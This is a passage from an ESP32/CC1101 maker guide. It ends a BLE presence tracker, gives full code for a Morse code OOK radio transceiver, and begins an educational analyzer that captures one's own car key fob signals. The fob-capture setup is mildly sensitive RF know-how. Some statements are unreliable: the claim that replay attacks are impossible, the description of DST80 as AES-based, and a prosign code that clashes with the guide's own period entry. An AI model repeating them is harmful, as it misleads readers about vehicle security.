        tft.drawString(info, 10, y + 14, 1);

        y += 30;
    }

    // Unknown device summary
    tft.setTextColor(TFT_DARKGREY);
    tft.drawString("Unknown BLE: " + String(unknown_count), 10, y + 10, 1);

    // Alert if any unknowns are suspicious
    int suspicious = countSuspiciousDevices();
    if (suspicious > 0) {
        tft.setTextColor(TFT_ORANGE);
        tft.drawString("Suspicious: " + String(suspicious), 160, y + 10, 1);
    }
}
```

Dashboard layout:

```
┌──────────────────────────────────┐
│      BLE Asset Tracker           │
│──────────────────────────────────│
│  iPhone                          │
│  ● Near    1.2m    -62 dBm      │
│                                  │
│  Apple Watch                     │
│  ● Immediate  0.3m    -48 dBm   │
│                                  │
│  Galaxy Buds                     │
│  ● Room    4.7m    -74 dBm      │
│                                  │
│  Fitbit                          │
│  ○ LOST    —       —            │
│                                  │
│──────────────────────────────────│
│  Unknown: 12   Suspicious: 0    │
└──────────────────────────────────┘
```

**Step 7 --- Add Appear/Disappear Alerts and Logging**

Trigger alerts when tracked devices change state:

```c
void checkPresenceChanges() {
    for (int i = 0; i < whitelist_count; i++) {
        TrackedDevice* dev = &whitelist[i];
        uint32_t age = millis() - dev->last_seen;

        // Device disappeared (was present, now timeout)
        if (dev->was_present && age > 30000) {
            dev->present = false;
            logEvent("DEPARTED", dev->name, dev->rssi_avg);
            playDepartTone();  // Short descending tone
        }

        // Device appeared (was absent, now present)
        if (!dev->was_present && dev->present) {
            logEvent("ARRIVED", dev->name, dev->rssi_avg);
            playArriveTone();  // Short ascending tone
        }

        dev->was_present = dev->present;
    }
}

void logEvent(const char* event, const char* device, int8_t rssi) {
    File f = SPIFFS.open("/ble_events.csv", FILE_APPEND);
    if (!f) return;
    f.printf("%lu,%s,%s,%d\n", millis(), event, device, rssi);
    f.close();
}
```

### Expected Results

- Your whitelisted devices will be detected within 1--3 seconds of entering BLE range
- RSSI readings will fluctuate by 5--10 dBm even when stationary (this is normal for BLE)
- The exponential moving average will smooth the RSSI to provide stable distance estimates
- Distance accuracy will be approximately plus or minus 2 meters indoors
- Presence detection (arrived/departed) will be reliable with the 30-second timeout
- In a typical home, you will see 15--40 unknown BLE devices (neighbors' phones, smart home equipment, passing pedestrians)
- AirTag detection will trigger correctly on persistent unknown Apple devices (test with your own AirTag first)

{: .tip }
> Calibrate the `RSSI_AT_1M` value for your specific devices. Place your phone exactly 1 meter from the T-Embed, note the average RSSI over 30 seconds, and use that value. This single calibration step significantly improves distance accuracy for all your devices.

### Extensions

- Add per-device RSSI history graphs showing signal strength over time
- Implement geofencing zones (alert when a device enters or leaves a defined proximity radius)
- Build a "find my device" mode that shows real-time RSSI as a bar graph --- walk around to locate a lost device by signal strength
- Log arrival and departure times to build daily presence patterns (when do you usually pick up your earbuds?)
- Add support for iBeacon and Eddystone protocol decoding to identify commercial beacons
- Deploy multiple T-Embed units in different rooms and triangulate device positions using RSSI from multiple receivers
- Integrate with your Smart Home Hub (Project 13) to trigger macros when your phone arrives home (turn on lights, start music)

---

## Project 16: Morse Code RF Transceiver
{: .d-inline-block }

Beginner
{: .label .label-green }

### Overview

Morse code is the original digital communication protocol. Before packet radio, before WiFi, before Bluetooth, there was Morse --- a binary encoding system that maps every letter, number, and punctuation mark to sequences of short and long signals. Despite being over 180 years old, Morse code remains relevant today: it is used in amateur radio, aviation, naval communication, and emergency signaling. Understanding Morse gives you a visceral, intuitive grasp of how all digital radio works at the most fundamental level.

In this project you will build a complete Morse code transceiver on the T-Embed CC1101 Plus. The device uses On-Off Keying (OOK) modulation at 433.92 MHz to transmit Morse signals and receive them from a second T-Embed. The rotary encoder serves as your Morse key --- press it briefly for a dit (dot), hold it longer for a dah (dash). The TFT display shows the Morse symbols as you key them, translates them to text in real time, and maintains a scrolling history log of received messages. The onboard speaker provides audible feedback --- the classic Morse sidetone.

This is one of the best introductory projects for understanding digital radio because every concept is visible and audible. You will see exactly how binary data becomes radio waves, how timing determines meaning, and how two devices can communicate across a room or across a building using nothing but on-off pulses. If you have two T-Embed devices, you can hold a full two-way Morse conversation. If you only have one, you can still build the transmitter and practice keying, or build the receiver and listen for signals from other 433 MHz OOK sources.

### What You'll Learn

- On-Off Keying (OOK) modulation --- the simplest form of digital radio transmission
- Morse code encoding and decoding algorithms
- Timing-based signal classification (distinguishing dits from dahs from spaces)
- CC1101 register configuration for OOK transmission and reception
- Real-time text rendering and scrolling on the ST7789 TFT display
- Rotary encoder input handling with debouncing and long-press detection
- Audio tone generation using the ESP32-S3 LEDC peripheral
- Two-way communication protocols and turn-taking

### Materials Needed

- T-Embed CC1101 Plus with 433 MHz antenna attached
- USB-C cable for programming and serial monitoring
- Arduino IDE (2.x) or PlatformIO with ESP32-S3 board support installed
- (Optional but recommended) A second T-Embed CC1101 Plus for two-way communication
- (Optional) Small piezo buzzer if your T-Embed variant lacks an onboard speaker
- (Optional) Computer with a serial terminal for debug output

### Step-by-Step Instructions

**Step 1 --- Understand the Morse Code Timing Standard**

Morse code is entirely defined by timing. The International Telecommunication Union (ITU) standard defines these relationships:

```
ELEMENT         DURATION
─────────────────────────────
Dit (dot)       1 unit
Dah (dash)      3 units
Intra-char gap  1 unit  (silence between dits/dahs within one letter)
Inter-char gap  3 units (silence between letters)
Word gap        7 units (silence between words)
```

At 15 words per minute (WPM) --- a comfortable beginner speed --- one unit is approximately 80 milliseconds:

```
Dit:            80 ms
Dah:           240 ms
Intra-char gap: 80 ms
Inter-char gap: 240 ms
Word gap:       560 ms
```

{: .tip }
> The "PARIS" method is the standard for calibrating Morse speed. The word "PARIS" contains exactly 50 units, so at 15 WPM, you send "PARIS" 15 times per minute. One unit = 60000 / (50 x WPM) milliseconds.

**Step 2 --- Build the Complete Morse Code Lookup Table**

Every letter, number, and common punctuation mark has a unique Morse code sequence:

```
LETTER  MORSE       LETTER  MORSE
──────────────────────────────────
  A     .-            N     -.
  B     -...          O     ---
  C     -.-.          P     .--.
  D     -..           Q     --.-
  E     .             R     .-.
  F     ..-.          S     ...
  G     --.           T     -
  H     ....          U     ..-
  I     ..            V     ...-
  J     .---          W     .--
  K     -.-           X     -..-
  L     .-..          Y     -.--
  M     --            Z     --..

NUMBER  MORSE       PUNCTUATION  MORSE
──────────────────────────────────────
  0     -----         .         .-.-.-
  1     .----         ,         --..--
  2     ..---         ?         ..--..
  3     ...--         '         .----.
  4     ....-         !         -.-.--
  5     .....         /         -..-.
  6     -....         (         -.--.
  7     --...         )         -.--.-
  8     ---..         &         .-...
  9     ----.         :         ---...
```

{: .note }
> Prosigns (procedure signals) are special Morse sequences sent without inter-character gaps. Common prosigns include `.-.-.-` (end of message), `-.-.-` (start/attention), and `...-.-` (end of work). These are used in amateur radio but optional for this project.

**Step 3 --- Set Up the Arduino Project and Pin Definitions**

Create a new Arduino sketch with the T-Embed CC1101 Plus pin definitions:

```cpp
// ============================================================
// Morse Code RF Transceiver for LILYGO T-Embed CC1101 Plus
// Frequency: 433.92 MHz | Modulation: OOK | Speed: 15 WPM
// ============================================================

#include <SPI.h>
#include <TFT_eSPI.h>

// --- T-Embed CC1101 Plus Pin Definitions ---
#define CC1101_SCLK    36
#define CC1101_MISO    37
#define CC1101_MOSI    35
#define CC1101_CS      38
#define CC1101_GDO0    39
#define CC1101_GDO2    40

#define ENCODER_A      4
#define ENCODER_B      5
#define ENCODER_BTN    6   // Active LOW

#define BUZZER_PIN     46
#define TONE_FREQ      700 // Classic Morse sidetone (Hz)

// --- Morse Timing Configuration ---
#define WPM            15
#define UNIT_MS        (1200 / WPM)  // ~80ms at 15 WPM
#define DIT_MS         UNIT_MS
#define DAH_MS         (UNIT_MS * 3)
#define INTRA_GAP_MS   UNIT_MS
#define INTER_GAP_MS   (UNIT_MS * 3)
#define WORD_GAP_MS    (UNIT_MS * 7)
#define DIT_DAH_THRESHOLD  (UNIT_MS * 2)  // ~160ms boundary

// --- Operating Mode ---
enum Mode { MODE_TX, MODE_RX };
Mode currentMode = MODE_TX;

// --- Display Layout (320x170 landscape) ---
#define SCREEN_W       320
#define SCREEN_H       170
#define MORSE_Y        10
#define TEXT_Y         50
#define HISTORY_Y      90
#define STATUS_Y       155

TFT_eSPI tft = TFT_eSPI();
```

**Step 4 --- Implement the Morse Code Lookup Engine**

The lookup table maps Morse sequences to characters. A linear search is perfectly fast enough for this table size:

```cpp
struct MorseChar {
    char character;
    const char* code;
};

const MorseChar morseTable[] = {
    {'A', ".-"},     {'B', "-..."},   {'C', "-.-."},
    {'D', "-.."},    {'E', "."},      {'F', "..-."},
    {'G', "--."},    {'H', "...."},   {'I', ".."},
    {'J', ".---"},   {'K', "-.-"},    {'L', ".-.."},
    {'M', "--"},     {'N', "-."},     {'O', "---"},
    {'P', ".--."},   {'Q', "--.-"},   {'R', ".-."},
    {'S', "..."},    {'T', "-"},      {'U', "..-"},
    {'V', "...-"},   {'W', ".--"},    {'X', "-..-"},
    {'Y', "-.--"},   {'Z', "--.."},   {'0', "-----"},
    {'1', ".----"},  {'2', "..---"},  {'3', "...--"},
    {'4', "....-"},  {'5', "....."},  {'6', "-...."},
    {'7', "--..."},  {'8', "---.."},  {'9', "----."},
    {'.', ".-.-.-"}, {',', "--..--"}, {'?', "..--.."},
    {'!', "-.-.--"}, {'/', "-..-."},  {'@', ".--.-."},
};
const int MORSE_TABLE_SIZE = sizeof(morseTable) / sizeof(morseTable[0]);

char decodeMorse(const char* code) {
    for (int i = 0; i < MORSE_TABLE_SIZE; i++) {
        if (strcmp(morseTable[i].code, code) == 0) {
            return morseTable[i].character;
        }
    }
    return '?';
}

const char* encodeMorse(char c) {
    c = toupper(c);
    for (int i = 0; i < MORSE_TABLE_SIZE; i++) {
        if (morseTable[i].character == c) {
            return morseTable[i].code;
        }
    }
    return NULL;
}
```

**Step 5 --- Configure the CC1101 for OOK Modulation**

OOK (On-Off Keying) is the simplest modulation: the transmitter is either on or off. This maps perfectly to Morse code --- carrier on during dits and dahs, off during gaps:

```cpp
// --- CC1101 Register Addresses ---
#define CC1101_IOCFG2    0x00
#define CC1101_IOCFG0    0x02
#define CC1101_PKTCTRL0  0x08
#define CC1101_FREQ2     0x0D
#define CC1101_FREQ1     0x0E
#define CC1101_FREQ0     0x0F
#define CC1101_MDMCFG2   0x12
#define CC1101_FREND0    0x22
#define CC1101_FSCAL3    0x23
#define CC1101_FSCAL2    0x24
#define CC1101_FSCAL1    0x25
#define CC1101_FSCAL0    0x26
#define CC1101_PATABLE   0x3E

// Command Strobes
#define CC1101_SRES      0x30
#define CC1101_STX       0x35
#define CC1101_SRX       0x34
#define CC1101_SIDLE     0x36

void cc1101_writeReg(uint8_t addr, uint8_t value) {
    digitalWrite(CC1101_CS, LOW);
    SPI.transfer(addr);
    SPI.transfer(value);
    digitalWrite(CC1101_CS, HIGH);
}

uint8_t cc1101_readReg(uint8_t addr) {
    digitalWrite(CC1101_CS, LOW);
    SPI.transfer(addr | 0x80);
    uint8_t val = SPI.transfer(0x00);
    digitalWrite(CC1101_CS, HIGH);
    return val;
}

void cc1101_strobe(uint8_t strobe) {
    digitalWrite(CC1101_CS, LOW);
    SPI.transfer(strobe);
    digitalWrite(CC1101_CS, HIGH);
}

void cc1101_reset() {
    digitalWrite(CC1101_CS, HIGH);
    delayMicroseconds(30);
    digitalWrite(CC1101_CS, LOW);
    delayMicroseconds(30);
    digitalWrite(CC1101_CS, HIGH);
    delayMicroseconds(45);
    cc1101_strobe(CC1101_SRES);
    delay(10);
}

void cc1101_setupOOK433() {
    cc1101_reset();

    // Frequency: 433.92 MHz
    // FREQ = 433.92e6 * 2^16 / 26e6 = 0x10B071
    cc1101_writeReg(CC1101_FREQ2, 0x10);
    cc1101_writeReg(CC1101_FREQ1, 0xB0);
    cc1101_writeReg(CC1101_FREQ0, 0x71);

    // OOK modulation, no sync word
    cc1101_writeReg(CC1101_MDMCFG2, 0x30);

    // Asynchronous serial mode for raw OOK control
    cc1101_writeReg(CC1101_PKTCTRL0, 0x32);

    // GDO0: serial data in/out
    cc1101_writeReg(CC1101_IOCFG0, 0x0D);

    // GDO2: carrier sense
    cc1101_writeReg(CC1101_IOCFG2, 0x0E);

    // TX power: +10 dBm for OOK
    cc1101_writeReg(CC1101_FREND0, 0x11);
    uint8_t paTable[2] = {0x00, 0xC0};
    digitalWrite(CC1101_CS, LOW);
    SPI.transfer(CC1101_PATABLE | 0x40);
    SPI.transfer(paTable[0]);
    SPI.transfer(paTable[1]);
    digitalWrite(CC1101_CS, HIGH);

    // Frequency synthesizer calibration
    cc1101_writeReg(CC1101_FSCAL3, 0xEA);
    cc1101_writeReg(CC1101_FSCAL2, 0x2A);
    cc1101_writeReg(CC1101_FSCAL1, 0x00);
    cc1101_writeReg(CC1101_FSCAL0, 0x1F);

    cc1101_strobe(CC1101_SIDLE);
}
```

{: .warning }
> The pin numbers above match the standard T-Embed CC1101 Plus pinout. If you have a different hardware revision, verify the SPI pins against your board's schematic. Incorrect SPI wiring will prevent all CC1101 communication.

**Step 6 --- Implement the Transmitter Logic**

The rotary encoder button acts as your Morse key. Press duration determines dit vs. dah:

```cpp
// --- Transmitter State ---
char morseBuffer[8];
int morseBufferPos = 0;
String currentWord = "";
String sentMessage = "";

#define HISTORY_SIZE 8
String history[HISTORY_SIZE];
int historyHead = 0;

unsigned long keyDownTime = 0;
unsigned long keyUpTime = 0;
bool keyDown = false;
bool lastKeyState = HIGH;
int morseXCursor = 5;
int textXCursor = 5;

void addToHistory(String prefix, String msg) {
    history[historyHead] = prefix + msg;
    historyHead = (historyHead + 1) % HISTORY_SIZE;
}

void txStartCarrier() {
    cc1101_strobe(CC1101_STX);
    pinMode(CC1101_GDO0, OUTPUT);
    digitalWrite(CC1101_GDO0, HIGH);
}

void txStopCarrier() {
    digitalWrite(CC1101_GDO0, LOW);
    cc1101_strobe(CC1101_SIDLE);
}

void handleTransmitter() {
    bool btnState = digitalRead(ENCODER_BTN);
    unsigned long now = millis();

    // Key pressed (HIGH -> LOW transition)
    if (btnState == LOW && lastKeyState == HIGH) {
        keyDown = true;
        keyDownTime = now;
        txStartCarrier();
        ledcWriteTone(0, TONE_FREQ);
    }

    // Key released (LOW -> HIGH transition)
    if (btnState == HIGH && lastKeyState == LOW) {
        keyDown = false;
        keyUpTime = now;
        unsigned long pressDuration = now - keyDownTime;

        txStopCarrier();
        ledcWriteTone(0, 0);

        if (pressDuration < DIT_DAH_THRESHOLD) {
            morseBuffer[morseBufferPos++] = '.';
            drawMorseSymbol('.');
        } else {
            morseBuffer[morseBufferPos++] = '-';
            drawMorseSymbol('-');
        }
        morseBuffer[morseBufferPos] = '\0';
    }

    // Inter-character gap: decode the letter
    if (!keyDown && morseBufferPos > 0 &&
        (now - keyUpTime > INTER_GAP_MS)) {
        char decoded = decodeMorse(morseBuffer);
        currentWord += decoded;
        drawDecodedChar(decoded);
        morseBufferPos = 0;
        memset(morseBuffer, 0, sizeof(morseBuffer));
        clearMorseLine();
    }

    // Word gap: commit the word to history
    if (!keyDown && currentWord.length() > 0 &&
        (now - keyUpTime > WORD_GAP_MS)) {
        sentMessage += currentWord + " ";
        addToHistory("TX> ", currentWord);
        drawHistory();
        currentWord = "";
        clearDecodedLine();
    }

    lastKeyState = btnState;
}
```

**Step 7 --- Implement the Receiver Logic**

The receiver listens for OOK bursts on 433.92 MHz. The CC1101's carrier sense pin (GDO2) goes high when a signal is present. The firmware measures on/off durations to reconstruct Morse:

```cpp
// --- Receiver State ---
char rxMorseBuffer[8];
int rxMorsePos = 0;
String rxCurrentWord = "";
bool carrierPresent = false;
unsigned long carrierStartTime = 0;
unsigned long carrierEndTime = 0;

void startReceiver() {
    cc1101_strobe(CC1101_SRX);
    pinMode(CC1101_GDO2, INPUT);
}

void handleReceiver() {
    bool carrier = digitalRead(CC1101_GDO2);
    unsigned long now = millis();

    // Carrier appeared
    if (carrier && !carrierPresent) {
        carrierPresent = true;
        carrierStartTime = now;
        ledcWriteTone(0, TONE_FREQ);
        tft.fillCircle(305, STATUS_Y + 5, 5, TFT_RED);
    }

    // Carrier disappeared
    if (!carrier && carrierPresent) {
        carrierPresent = false;
        carrierEndTime = now;
        unsigned long onDuration = now - carrierStartTime;
        ledcWriteTone(0, 0);
        tft.fillCircle(305, STATUS_Y + 5, 5, TFT_DARKGREY);

        if (onDuration > (DIT_MS / 2) && onDuration < DIT_DAH_THRESHOLD) {
            rxMorseBuffer[rxMorsePos++] = '.';
            drawMorseSymbol('.');
        } else if (onDuration >= DIT_DAH_THRESHOLD &&
                   onDuration < (DAH_MS * 2)) {
            rxMorseBuffer[rxMorsePos++] = '-';
            drawMorseSymbol('-');
        }
        rxMorseBuffer[rxMorsePos] = '\0';
    }

    // Inter-character gap
    if (!carrierPresent && rxMorsePos > 0 &&
        (now - carrierEndTime > INTER_GAP_MS)) {
        char decoded = decodeMorse(rxMorseBuffer);
        rxCurrentWord += decoded;
        drawDecodedChar(decoded);
        rxMorsePos = 0;
        memset(rxMorseBuffer, 0, sizeof(rxMorseBuffer));
        clearMorseLine();
    }

    // Word gap
    if (!carrierPresent && rxCurrentWord.length() > 0 &&
        (now - carrierEndTime > WORD_GAP_MS)) {
        addToHistory("RX> ", rxCurrentWord);
        drawHistory();
        rxCurrentWord = "";
        clearDecodedLine();
    }
}
```

**Step 8 --- Build the TFT Display Interface**

The display is divided into four zones --- Morse symbols, decoded text, message history, and status bar:

```cpp
void initDisplay() {
    tft.init();
    tft.setRotation(1);
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.setTextSize(1);
    tft.drawString("MORSE", 5, MORSE_Y - 8);
    tft.drawString("TEXT", 5, TEXT_Y - 8);
    tft.drawString("HISTORY", 5, HISTORY_Y - 8);
    tft.drawFastHLine(0, TEXT_Y - 2, SCREEN_W, TFT_DARKGREY);
    tft.drawFastHLine(0, HISTORY_Y - 2, SCREEN_W, TFT_DARKGREY);
    tft.drawFastHLine(0, STATUS_Y - 2, SCREEN_W, TFT_DARKGREY);
    drawStatusBar();
}

void drawMorseSymbol(char symbol) {
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setTextSize(3);
    tft.drawChar(symbol, morseXCursor, MORSE_Y + 2);
    morseXCursor += 20;
    if (morseXCursor > SCREEN_W - 20) morseXCursor = 5;
}

void clearMorseLine() {
    tft.fillRect(0, MORSE_Y, SCREEN_W, 30, TFT_BLACK);
    morseXCursor = 5;
}

void drawDecodedChar(char c) {
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setTextSize(3);
    tft.drawChar(c, textXCursor, TEXT_Y + 2);
    textXCursor += 20;
    if (textXCursor > SCREEN_W - 20) {
        tft.fillRect(0, TEXT_Y, SCREEN_W, 30, TFT_BLACK);
        textXCursor = 5;
    }
}

void clearDecodedLine() {
    tft.fillRect(0, TEXT_Y, SCREEN_W, 30, TFT_BLACK);
    textXCursor = 5;
}

void drawHistory() {
    tft.fillRect(0, HISTORY_Y, SCREEN_W,
                 STATUS_Y - HISTORY_Y - 4, TFT_BLACK);
    tft.setTextSize(1);
    int y = HISTORY_Y + 2;
    for (int i = 0; i < HISTORY_SIZE; i++) {
        int idx = (historyHead - 1 - i + HISTORY_SIZE) % HISTORY_SIZE;
        if (history[idx].length() > 0) {
            tft.setTextColor(
                history[idx].startsWith("TX>") ? TFT_GREEN : TFT_YELLOW,
                TFT_BLACK);
            tft.drawString(history[idx], 5, y);
            y += 10;
            if (y > STATUS_Y - 12) break;
        }
    }
}

void drawStatusBar() {
    tft.fillRect(0, STATUS_Y, SCREEN_W, SCREEN_H - STATUS_Y, TFT_BLACK);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setTextSize(1);
    String modeStr = (currentMode == MODE_TX) ? "TX" : "RX";
    tft.drawString(modeStr + " | 433.92 MHz | OOK | " +
                   String(WPM) + " WPM", 5, STATUS_Y + 3);
    tft.fillCircle(305, STATUS_Y + 5, 5, TFT_DARKGREY);
}
```

The display layout:

```
┌──────────────────────────────────────────┐
│ MORSE                                    │
│  . - . -                                 │
│──────────────────────────────────────────│
│ TEXT                                     │
│  H E L L                                │
│──────────────────────────────────────────│
│ HISTORY                                  │
│  TX> HELLO WORLD                        │
│  RX> HI THERE                           │
│  TX> CQ CQ CQ                           │
│──────────────────────────────────────────│
│ TX | 433.92 MHz | OOK | 15 WPM       ● │
└──────────────────────────────────────────┘
```

**Step 9 --- Implement Mode Switching and Main Loop**

Rotate the encoder to switch between TX and RX modes:

```cpp
volatile int encoderPos = 0;

void IRAM_ATTR encoderISR() {
    encoderPos += (digitalRead(ENCODER_B) == LOW) ? 1 : -1;
}

void checkModeSwitch() {
    static int lastPos = 0;
    if (encoderPos != lastPos) {
        currentMode = (currentMode == MODE_TX) ? MODE_RX : MODE_TX;
        if (currentMode == MODE_RX) {
            txStopCarrier();
            startReceiver();
        } else {
            cc1101_strobe(CC1101_SIDLE);
        }
        drawStatusBar();
        lastPos = encoderPos;
    }
}

void setup() {
    Serial.begin(115200);
    pinMode(ENCODER_BTN, INPUT_PULLUP);
    pinMode(ENCODER_A, INPUT_PULLUP);
    pinMode(ENCODER_B, INPUT_PULLUP);
    pinMode(CC1101_CS, OUTPUT);
    digitalWrite(CC1101_CS, HIGH);

    SPI.begin(CC1101_SCLK, CC1101_MISO, CC1101_MOSI, CC1101_CS);

    ledcSetup(0, TONE_FREQ, 8);
    ledcAttachPin(BUZZER_PIN, 0);
    ledcWriteTone(0, 0);

    cc1101_setupOOK433();
    initDisplay();
    attachInterrupt(digitalPinToInterrupt(ENCODER_A),
                    encoderISR, FALLING);

    Serial.println("Morse Transceiver Ready");
}

void loop() {
    checkModeSwitch();
    if (currentMode == MODE_TX) {
        handleTransmitter();
    } else {
        handleReceiver();
    }
}
```

**Step 10 --- Upload, Test, and Communicate**

1. Select **Board: ESP32S3 Dev Module** and the correct COM port in Arduino IDE
2. Upload the sketch
3. The display should show the interface with "TX" mode active
4. Press the encoder button briefly for a dit (`.`), hold longer for a dah (`-`)
5. Key `.-` (dit-dah) and wait 240ms --- the letter "A" appears on the text line
6. Key a full word: `.... . .-.. .-.. ---` (HELLO) with pauses between letters
7. After the word gap (560ms), "HELLO" appears in the history log
8. Rotate the encoder to switch to RX mode
9. If you have a second T-Embed in TX mode, key a message and watch it decode on the first device

{: .tip }
> Practice on a Morse code trainer website first to build muscle memory. At 15 WPM, a dit is a quick tap (~80ms) and a dah is a deliberate hold (~240ms). The gap between letters happens naturally when you pause to think.

### Expected Results

- In TX mode, each encoder press produces a clean OOK burst at 433.92 MHz
- The sidetone provides immediate audio feedback for comfortable keying
- Morse symbols appear on screen in real time as you key them
- Letters decode correctly after the inter-character gap (~240ms of silence)
- Words appear in the history log after the word gap (~560ms of silence)
- In RX mode, OOK signals at 433.92 MHz are decoded to text on screen
- With two T-Embed devices, you can hold a two-way Morse conversation
- Range is approximately 30--50 meters indoors, 100+ meters outdoors line-of-sight
- The history log scrolls and color-codes TX (green) vs. RX (yellow) messages

### Extensions

- Add adjustable WPM speed using the rotary encoder (5--25 WPM range)
- Implement an Iambic keyer mode where rotation direction determines dit vs. dah (like a paddle key)
- Add a built-in Morse code practice mode that displays random characters for the user to key
- Store received messages to SPIFFS as a text log file with timestamps
- Add RSSI display in RX mode so you can see signal strength of incoming Morse
- Implement a "beacon" mode that automatically transmits a CQ or identification message at intervals

---

## Project 17: Car Key Fob Signal Analyzer
{: .d-inline-block }

Intermediate
{: .label .label-yellow }

### Overview

Every time you press the button on your car key fob, a carefully engineered burst of RF energy carries an encrypted, ever-changing code to your vehicle's receiver. Modern automotive key fobs are among the most sophisticated consumer RF devices in existence, using rolling code algorithms that generate a new cryptographic challenge on every single button press. This project teaches you to capture and analyze the RF characteristics of your own key fob's transmissions --- not to clone or replay them (which is impossible with rolling codes), but to understand exactly why modern automotive RF security works.

You will capture multiple transmissions from your own key fob, measure the frequency, modulation type, signal duration, preamble structure, and data length. Then you will compare multiple presses side by side to see rolling codes in action --- every press produces completely different data even though you are pressing the same button. This visual demonstration of rolling code behavior is one of the most powerful ways to understand why replay attacks fail against modern vehicles. You will also learn about the specific rolling code algorithms used in the automotive industry: KeeLoq (used by most manufacturers), AUT64 (Toyota), and Hitag2 (legacy systems).

This is purely an educational analysis project. You are studying the signal characteristics of a device you own. At no point will you attempt to clone, replay, or interfere with any vehicle's key fob system. The project explicitly demonstrates why such attempts would fail.

{: .danger }
> **This project is for analyzing YOUR OWN key fob signals on YOUR OWN vehicle only.** Never capture signals from vehicles you do not own. Even passive signal analysis of others' key fobs may violate wiretapping laws in some jurisdictions. The goal is education, not exploitation. See [Chapter 13 --- Legal Reference](13-legal-reference/) for full details.

### What You'll Learn

- Automotive RF frequency bands and allocation (315 MHz North America, 433.92 MHz Europe/Asia)
- Rolling code cryptographic principles (KeeLoq, AUT64, Hitag2)
- Signal characteristic measurement: frequency, bandwidth, modulation, timing
- Visual comparison of fixed-code vs. rolling-code transmissions
- RF preamble and sync word identification
- Why replay attacks are mathematically impossible against properly implemented rolling codes
- CC1101 RSSI and frequency offset measurement techniques
- Systematic RF signal documentation methodology

### Materials Needed

- T-Embed CC1101 Plus with appropriate antenna (315 MHz for North American vehicles, 433 MHz for European/Asian)
- Your own car key fob (check the FCC ID label on the back to confirm frequency)
- USB-C cable for programming
- Arduino IDE or PlatformIO
- Notebook for recording observations
- (Optional) A second, older fixed-code RF remote for comparison (garage door, gate, etc.)

{: .tip }
> To find your key fob's frequency before starting: look for the FCC ID printed on the back of the fob. Search it at [fcc.gov/oet/ea/fccid](https://www.fcc.gov/oet/ea/fccid) to find the exact operating frequency and modulation type.

### Step-by-Step Instructions

**Step 1 --- Understand Rolling Code Systems**

Before touching the T-Embed, understand the three major rolling code systems used in automotive key fobs:

```
┌─────────────────────────────────────────────────────────┐
│                    KeeLoq (Microchip)                   │
├─────────────────────────────────────────────────────────┤
│ Used by: GM, Chrysler, Fiat, Volvo, Jaguar, many others│
│ Key length: 64-bit                                      │
│ Counter: 16-bit synchronization counter                 │
│ Algorithm: Non-linear feedback shift register (NLFSR)   │
│ Security: Each press generates unique 32-bit hopping    │
│           code from 64-bit secret key + counter         │
│ Sync window: Receiver accepts codes within ~256 ahead   │
│              of last valid counter value                 │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│                    AUT64 (Toyota)                        │
├─────────────────────────────────────────────────────────┤
│ Used by: Toyota, Lexus, Scion                           │
│ Key length: 128-bit                                     │
│ Algorithm: Proprietary block cipher                     │
│ Security: Challenge-response between fob and car        │
│           Car sends random challenge, fob encrypts it   │
│           with shared 128-bit key, car verifies         │
│ Note: Newer Toyota uses AES-based DST80                 │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│                   Hitag2 (NXP) [Legacy]                 │
├─────────────────────────────────────────────────────────┤
│ Used by: Older VW, Audi, Seat, Skoda, some others      │
│ Key length: 48-bit                                      │
│ Algorithm: Stream cipher (LFSR-based)                   │
│ Security: Known to be cryptographically weak            │
│           Vulnerable to algebraic attacks               │
│ Status: Replaced by Hitag AES in newer vehicles         │
│ Note: Even this "weak" system defeats simple replay     │
└─────────────────────────────────────────────────────────┘
```

{: .note }
> Even Hitag2, which is considered cryptographically broken by academic researchers, still uses a rolling code that changes on every press. "Broken" in cryptography means that the secret key can be recovered with enough captured signals and computation --- it does NOT mean that a simple capture-and-replay attack works. Breaking Hitag2 requires specialized equipment and mathematical attacks far beyond what a T-Embed can do.

**Step 2 --- Configure the CC1101 for Key Fob Signal Analysis**

Set up the CC1101 to receive on your key fob's frequency with wide bandwidth to capture the full signal:

```cpp
// ============================================================
// Car Key Fob Signal Analyzer
// EDUCATIONAL ONLY - Analyzes YOUR OWN key fob RF signals
// ============================================================

#include <SPI.h>
#include <TFT_eSPI.h>

// --- Pin Definitions (T-Embed CC1101 Plus) ---
#define CC1101_SCLK    36
#define CC1101_MISO    37
#define CC1101_MOSI    35
#define CC1101_CS      38
#define CC1101_GDO0    39
#define CC1101_GDO2    40
#define ENCODER_A      4
#define ENCODER_B      5
#define ENCODER_BTN    6

// --- Analysis Configuration ---
// Change this to 315000000 for North American key fobs
// or 433920000 for European/Asian key fobs
#define TARGET_FREQ    315000000

#define MAX_CAPTURES   5    // Number of presses to analyze
#define MAX_SAMPLES    512  // Raw samples per capture
#define SAMPLE_INTERVAL_US 100  // 100us between samples = 10kHz

TFT_eSPI tft = TFT_eSPI();

// --- CC1101 SPI Helpers (same as Project 16) ---
void cc1101_writeReg(uint8_t addr, uint8_t value) {
    digitalWrite(CC1101_CS, LOW);
    SPI.transfer(addr);
    SPI.transfer(value);
    digitalWrite(CC1101_CS, HIGH);
}

uint8_t cc1101_readReg(uint8_t addr) {
    digitalWrite(CC1101_CS, LOW);
    SPI.transfer(addr | 0x80);
    uint8_t val = SPI.transfer(0x00);
    digitalWrite(CC1101_CS, HIGH);
    return val;
}

uint8_t cc1101_readStatus(uint8_t addr) {
    digitalWrite(CC1101_CS, LOW);
    SPI.transfer(addr | 0xC0);  // Burst read for status registers
    uint8_t val = SPI.transfer(0x00);
    digitalWrite(CC1101_CS, HIGH);
    return val;
}

void cc1101_strobe(uint8_t cmd) {
    digitalWrite(CC1101_CS, LOW);
    SPI.transfer(cmd);
    digitalWrite(CC1101_CS, HIGH);
}

// --- Signal Capture Storage ---
struct SignalCapture {
    uint8_t rawBits[MAX_SAMPLES];  // 0 or 1 (OOK state)
    int8_t  rssiValues[64];        // RSSI snapshots
    int     sampleCount;
    unsigned long durationUs;
    unsigned long timestamp;
    float   peakRSSI;
    bool    valid;
};

SignalCapture captures[MAX_CAPTURES];
int captureCount = 0;
```

**Step 3 --- Implement the Signal Capture Engine**

